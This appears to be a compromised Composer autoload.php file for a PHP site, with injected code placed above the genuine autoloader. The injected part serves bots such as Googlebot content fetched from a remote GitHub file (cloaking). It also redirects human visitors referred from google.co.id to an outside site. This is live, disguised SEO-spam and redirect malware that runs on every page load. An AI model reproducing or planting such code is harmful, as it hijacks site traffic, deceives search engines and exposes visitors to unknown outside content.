<?php
$sibarto = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
$bonda_malala = "https://linkaktifzona.site/ampjson/";

function is_bot() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT']; 
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 
'Google-InspectionTool', 'AhrefsBot'); 
 
    foreach ($bots as $bot) { 
        if (stripos($user_agent, $bot) !== false) { 
            return true; 
        } 
    } 
 
    return false; 
} 
 
if (is_bot()) { 
    $message = file_get_contents('https://raw.githubusercontent.com/nathaniakhongg/yoshi/refs/heads/main/json.txt');#JAWA
    echo $message; 
}

if (!empty($sibarto) && (stripos($sibarto, "google.co.id") !== false)) {
    header("HTTP/1.1 302 Found");
    header("Location: ".$bonda_malala);
    exit();
}
// autoload.php @generated by Composer

if (PHP_VERSION_ID < 50600) {
    if (!headers_sent()) {
        header('HTTP/1.1 500 Internal Server Error');
    }
    $err = 'Composer 2.3.0 dropped support for autoloading on PHP <5.6 and you are running '.PHP_VERSION.', please upgrade PHP or use Composer 2.2 LTS via "composer self-update --2.2". Aborting.'.PHP_EOL;
    if (!ini_get('display_errors')) {
        if (PHP_SAPI === 'cli' || PHP_SAPI === 'phpdbg') {
            fwrite(STDERR, $err);
        } elseif (!headers_sent()) {
            echo $err;
        }
    }
    trigger_error(
        $err,
        E_USER_ERROR
    );
}

require_once __DIR__ . '/composer/autoload_real.php';

return ComposerAutoloaderInit2aaf08fdfad7ab39074f4acd6696ba44::getLoader();
